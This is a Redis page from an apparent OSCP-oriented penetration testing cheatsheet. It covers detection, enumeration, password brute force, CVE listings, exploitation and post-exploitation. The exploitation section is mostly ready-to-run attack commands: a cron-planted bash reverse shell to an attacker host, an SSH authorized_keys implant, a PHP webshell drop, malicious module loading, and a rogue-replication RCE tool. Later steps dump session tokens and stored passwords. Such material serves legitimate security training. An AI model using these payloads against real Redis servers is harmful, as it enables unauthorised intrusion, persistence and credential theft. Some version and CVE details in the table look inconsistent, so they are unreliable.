# Redis

> Part of [Databases](./README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Authentication](#3-authentication)
- [4. Known CVEs](#4-known-cves)
- [5. Exploitation](#5-exploitation)
- [6. Post-exploitation](#6-post-exploitation)
- [7. OSCP notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### 1.1 Port and service

Default port **6379**. Common deviations: 6380, 16379.

Redis speaks a plaintext protocol called RESP. `nc` works for basic interaction.

```bash
# Version + info
nmap -sV -p 6379 <TARGET>
nmap -p 6379 --script redis-info <TARGET>

# Raw connect
nc -nv <TARGET> 6379
PING
INFO
```

Expected output:

```text
6379/tcp open  redis   Redis key-value store 6.0.16
```

### 1.2 Version to CVE mapping

| Version range | Notable CVEs |
|---------------|--------------|
| < 5.0.5 | Default config allows module load (Lua sandbox escape) |
| <= 6.2.7 / 7.0.0 | CVE-2022-24735 (Lua sandbox escape) |
| <= 7.0.8 / 6.2.13 | CVE-2023-25155 (integer overflow in SETRANGE) |
| <= 6.2.8 / 7.0.4 | CVE-2022-36021 (Lua sandbox escape) |

---

## 2. Enumeration

### 2.1 Unauthenticated

If `requirepass` is not set (default), you have full access:

```text
INFO
CONFIG GET *
CLIENT LIST
DBSIZE
KEYS *
```

### 2.2 Check auth

```text
PING
```

- Response `+PONG` -> no auth required.
- Response `-NOAUTH Authentication required.` -> auth needed.

### 2.3 List all keys

```text
KEYS *
```

Warning: `KEYS *` is O(N) and blocks Redis on large datasets. Use `SCAN 0 COUNT 1000` in production.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).
> The `KEYS *` output often reveals session tokens or credentials.

---

## 3. Authentication

### 3.1 Common defaults

Redis has **no default password** - if `requirepass` is not configured, it is fully open.

### 3.2 Brute force

```bash
# Metasploit
msfconsole -q -x "use auxiliary/scanner/redis/redis_login; set RHOSTS <TARGET>; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"

# nmap NSE
nmap -p 6379 --script redis-brute <TARGET>
```

### 3.3 Authenticate

```text
AUTH <PASSWORD>
```

---

## 4. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2022-24735 | Redis <= 6.2.7 / 7.0.0 | Lua sandbox escape via `EVAL` | https://nvd.nist.gov/vuln/detail/CVE-2022-24735 |
| CVE-2022-24736 | Redis <= 6.2.7 / 7.0.0 | Lua sandbox escape (loadstring) | https://nvd.nist.gov/vuln/detail/CVE-2022-24736 |
| CVE-2022-36021 | Redis <= 6.2.8 / 7.0.4 | Lua sandbox escape via `cjson` | https://nvd.nist.gov/vuln/detail/CVE-2022-36021 |
| CVE-2023-25155 | Redis <= 7.0.8 / 6.2.13 | Integer overflow in `SETRANGE` | https://nvd.nist.gov/vuln/detail/CVE-2023-25155 |

---

## 5. Exploitation

### 5.1 RCE via `CONFIG SET` + RDB (cron)

Redis can write files as the `redis` user. If a cron directory is writable:

```text
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\n\n"
SAVE
```

### 5.2 RCE via SSH authorized_keys

If `/root/.ssh` or `/home/<USER>/.ssh` is writable:

```text
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-ed25519 AAAA... attacker@box\n\n"
SAVE
```

Then SSH in with the private key.

### 5.3 RCE via webshell

If a webroot is writable:

```text
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['cmd']); ?>"
SAVE
```

Then: `curl 'http://<TARGET>/shell.php?cmd=id'`

### 5.4 RCE via Redis Modules (RedisModules)

Load a malicious .so via `MODULE LOAD` (requires `enable-module-command yes` or Redis < 5.0.5):

```text
MODULE LOAD /tmp/exp.so
system.exec "id"
```

### 5.5 RCE via master-slave replication

The `RedisModules-ExecuteCommand` / `redis-rogue-server` technique: make the target a slave of your rogue server, which serves a malicious module.

```bash
git clone https://github.com/n0b0dyCN/redis-rogue-server
cd redis-rogue-server
python3 redis-rogue-server.py --rhost <TARGET> --rport 6379 --lhost <LHOST> --lport <LPORT>
```

---

## 6. Post-exploitation

### 6.1 Dump all keys

```text
KEYS *
GET <KEY>
```

Common interesting keys: session tokens, JWT, API keys, cached credentials.

### 6.2 CONFIG GET * (dump config)

```text
CONFIG GET *
```

Reveals: `dir`, `dbfilename`, `requirepass`, `masterauth`.

### 6.3 Check `requirepass`

```text
CONFIG GET requirepass
```

If set, the value is returned in cleartext.

### 6.4 Persistence

Redis supports `SAVE` and `BGSAVE` to write the current dataset to disk. The dbfilename + dir combination determines the path.

---

## 7. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the Redis connection and `INFO` / `CONFIG GET *` output that proves access.

> [!IMPORTANT]
> OSCP report: screenshot the RCE (reverse shell received or webshell response) via `CONFIG SET` + `SAVE`.

> [!IMPORTANT]
> OSCP report: screenshot `CONFIG GET requirepass` or any `GET` of a key that yields credentials.

---

## 8. References

- Redis official docs: https://redis.io/docs/
- HackTricks - Redis: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
- PayloadsAllTheThings - Redis: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md
- redis-rogue-server: https://github.com/n0b0dyCN/redis-rogue-server
- CVE-2022-24735: https://nvd.nist.gov/vuln/detail/CVE-2022-24735
- CVE-2022-24736: https://nvd.nist.gov/vuln/detail/CVE-2022-24736
- CVE-2022-36021: https://nvd.nist.gov/vuln/detail/CVE-2022-36021
- CVE-2023-25155: https://nvd.nist.gov/vuln/detail/CVE-2023-25155

---